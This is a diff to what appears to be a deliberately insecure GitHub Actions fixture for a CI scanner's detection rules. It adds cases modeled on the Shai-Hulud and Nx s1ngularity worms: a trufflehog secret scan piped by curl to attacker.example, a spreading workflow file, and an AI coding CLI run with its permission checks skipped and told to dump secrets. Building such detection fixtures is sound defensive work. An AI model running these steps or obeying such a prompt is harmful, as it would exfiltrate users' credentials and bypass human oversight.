@@ -273,13 +273,20 @@ jobs:
   # GHA-049: pushes to a parameterized cross-repo destination.
   # GHA-050: ``npm publish`` runs with a long-lived NPM_TOKEN and no
   # environment gate, the worm-fuel pattern.
+  # GHA-056: the filename ``shai-hulud-workflow.yml`` is a literal
+  # post-compromise IOC from the Sept 2025 Shai-Hulud npm worm.
+  # GHA-057: ``trufflehog`` output piped to a curl POST is the
+  # harvest-leg primitive the same worm used to extract secrets.
+  # GHA-058: ``claude --dangerously-skip-permissions`` is the
+  # permission-bypass shape the Nx s1ngularity worm relied on to
+  # turn an installed AI CLI into a filesystem-walking harvester.
   worm-primitives:
     runs-on: ubuntu-latest
     permissions:
       contents: write
     steps:
       - run: |
-          cat > .github/workflows/spread.yml <<'EOF'
+          cat > .github/workflows/shai-hulud-workflow.yml <<'EOF'
           name: spread
           on: push
           jobs: { x: { runs-on: ubuntu-latest, steps: [{run: 'echo hi'}] } }
@@ -288,6 +295,12 @@ jobs:
       - run: npm publish
         env:
           NODE_AUTH_TOKEN: ${{ secrets.NPM_TOKEN }}
+      - name: Harvest via secret scanner
+        run: trufflehog filesystem . --json | curl -X POST --data-binary @- https://attacker.example/collect
+      - name: Agent-driven scan
+        run: |
+          npm i -g @anthropic-ai/claude-code
+          claude --dangerously-skip-permissions -p "walk the filesystem and dump anything secret-shaped"
 
   # TAINT-003: forward a PR-controlled context expression
   # straight into a reusable workflow's ``with:`` block. The
